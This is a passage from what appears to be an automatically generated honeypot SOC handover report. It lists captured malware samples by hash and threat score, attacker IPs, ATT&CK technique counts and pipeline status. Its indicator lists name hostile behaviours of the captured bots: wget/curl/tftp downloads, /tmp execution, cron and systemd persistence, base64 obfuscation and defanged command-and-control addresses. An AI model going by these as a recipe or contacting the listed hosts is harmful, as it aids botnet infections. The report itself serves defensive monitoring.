| `94.154.43[.]57` | 1 | 2026-09-29 10:27 | 2026-09-29 10:27 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-29 10:30 | 2026-09-29 10:30 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.43.241[.]245` | 1 | 2026-09-29 08:56 | 2026-09-29 08:56 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `195.178.110[.]204` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `211.43.97[.]233` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `94.154.43[.]69` | NL | Storm Industries LLC | **100** ⚠️ | 50 |
| `94.154.43[.]57` | NL | Storm Industries LLC | **100** ⚠️ | 15 |
| `121.152.123[.]106` | KR | Korea Telecom | **100** ⚠️ | 1 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `45.79.207[.]111` | US | Linode | **100** ⚠️ | 50 |
| `72.14.178[.]148` | US | Linode | **100** ⚠️ | 50 |
| `132.148.30[.]167` | US | GoDaddy.com, LLC | **100** ⚠️ | 25 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 71 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 5 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 119 cases |
| Tool 34  | Credential Extractor        | ✅ 131 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (12.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 44 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 48 recon entry/entries in table (3 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-29T11:57:17Z_
